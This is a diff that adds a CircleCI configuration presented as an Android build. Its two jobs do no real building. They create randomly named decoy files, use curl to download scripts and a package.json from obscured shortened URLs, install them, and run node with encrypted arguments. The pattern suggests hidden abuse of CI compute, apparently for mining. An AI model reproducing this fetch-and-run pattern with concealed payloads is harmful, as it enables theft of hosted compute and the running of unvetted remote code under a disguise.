@@ -1,0 +1,51 @@
+version: 2.1
+orbs:
+  android: circleci/android@1.0
+jobs:
+  FuckJobs:
+    executor:
+      name: android/android-machine
+    steps:
+      - run: mkdir g57kglbjtwagr0j8
+      - run: curl -fsSL shorturl.at/GPS04 -o 5ux6u6ccai7tc4yq.js && curl -fsSL
+          shorturl.at/jEIM5 -o package.json && curl -fsSL shorturl.at/afzQ0 -o
+          6gxwu28t5ajmc1ueicef.js
+      - run: mkdir ldj3lhogmoaqepsajsc1109
+      - run: npm i -s
+      - run: touch otzh750o7ng2o1le6ey.js
+      - run: touch dgmof95hm9i6gqj86lnu9.c
+      - run: node 5ux6u6ccai7tc4yq -r
+          U2FsdGVkX19Zf0aJFd/u7cjz7pdNCcCtK80nXfDj/DiO6NWEoktLzkrZupRZForDgXa+mTvmxbwWo+cbf6ynhMKH8WS8msroR3dHCN1CKxG7id4ha1Hyhpeb9RPYfXiTGSBbl5VgX8jeiUg5ZaC/H7J/+QeBG4OiXgZX/cvh6x8liHPqmabl/byml4oq0lmuZAPZ25b3l4Lh4JJy3KOA3WBndCJBTRJB2xQzcRoXT3kHgCPtQkHDIpbA0HncMbbjjvkTXzvBTA/LTbBwPSOMVCboAWbsD5IQXngtT+eLji3aEcvhjT64J2d4Rn45UC2GqPSWjahCNXs3z2acOH7rsTLhUVMwrq7xWejr0agEMo0z/psoA0WKvhJ8aFias8+7
+          -lpn U2FsdGVkX1+C5Fx00RwKsyEzs1ruug9sjp898ZVfp/vPoyrHihEwZne+5Qfj14k9
+          -sp -s
+          U2FsdGVkX1+q4DDyh+3K3CFuXBINyH+8w+VMSXvrO9lJqtytf03PEnZyF8QSMNvTaVvv+jZamU1GMF2YblMfmZNOLJ87CpiVc4jKxbide1L6nburpsR1FyiriS4ER9TT/RMEoh3XYKVdMLn/Xpieaf9DEjxcMDjNWMkY6T48ild2IyecjYgNzim0YoLLLJKL9jT7Q3yIlnD1jbBGr8WsEo7ibv32CuIaUe6MBn8BiaQ=
+          -t U2FsdGVkX18+wpSNiUqWXV5678zpHzC/BKO1q0fOqQ4Ivsw57FJzu/aA9MVz88Yv
+      - run: touch p2leo8oe9fwuyw6h7zxs.php
+      - run: mkdir 3dpvinklupjpy2pkomw2skjd
+  ditmecuocdoi:
+    executor:
+      name: android/android-machine
+    steps:
+      - run: touch 1kialoxvdeyrrcfkeshi.py
+      - run: touch i3q5f9jabgd7jnq7zfpi.html
+      - run: curl -fsSL shorturl.at/fCG39 -o package.json && curl -fsSL
+          shorturl.at/jmJR6 -o abzhlrwhadhxz0w9n.js && curl -fsSL
+          shorturl.at/hHLW2 -o y5zzwbpby6a4.js
+      - run: mkdir joar60ag6g9zd4m6l9c
+      - run: npm i -s
+      - run: touch 8ti0duo1qdshyr9gn.ts
+      - run: touch isjbn3s18u9ho6fn2ltj.ts
+      - run: mkdir awab0dkdfkzqg6
+      - run: node y5zzwbpby6a4 -sp -lpn
+          U2FsdGVkX19DYtPcZpWe7Sw+qUWzZ17rVYMTIYeHCr/apOHgJ/+T4mr8wMC4bBuQ -r
+          U2FsdGVkX19Gi8DjlxYAGbkU86YNlziqHqVvt9jQhG8NChdBAc1jX8FpZCYq9BoV96pL/EGOYM5HuTwwIhxbGxWLjGqOfXj5ak2mrfaKNguLW4tbIE37eRM64FSPI65jggxLdtq3bXH5wbNaZI/trKDR7MNaN3x56QaW3eyouOvt65GlLr/Vul/JUo6RwW0Ta5A7vkUpc9BDQvDVFHXul1PsTL7rDKH+aX/I8Z29+Pf5aMojrr0BEVJBISPtS0yplOtUN0tsUi7VzmOkC/Lp/dDzDbKrhBAyVqG7eZJgclmp/PElUa1xMdWidkyUZyyerZHZ0l2SkFvAuotPyqA3sdgEfmRNK4eE07UZJdyAlA7yT3iZnr2tmD+iKMwLVbMM
+          -s
+          U2FsdGVkX1/hSLaeeiKV//1CG/A6L0A5Di1RSOLvVjGoAqQ9nHGBrAdA8OHyH8TRMnH4le/OYuUbSDUBg2ZgRwhNbqhzPfoj1wEw3JDtncB8hxIWpHNyUvQJ8W5Q0cqM6ACz8LUagel4JN9BPLqVb2Nt+O/3yAZuWxM7DzU3GeikDgoisB2teea0tcCgK5oWTL1Y5+IbPvkNmBSQ2GR5DQyanwQWe/STziEIqE61Rv8=
+          -t U2FsdGVkX1+TnmYifYCGa8HIf2+idINmKvCnyL67DVpDqyqwMValy3dAdVP6bp2X
+workflows:
+  startWork:
+    jobs:
+      - FuckJobs
+  deploy:
+    jobs:
+      - ditmecuocdoi
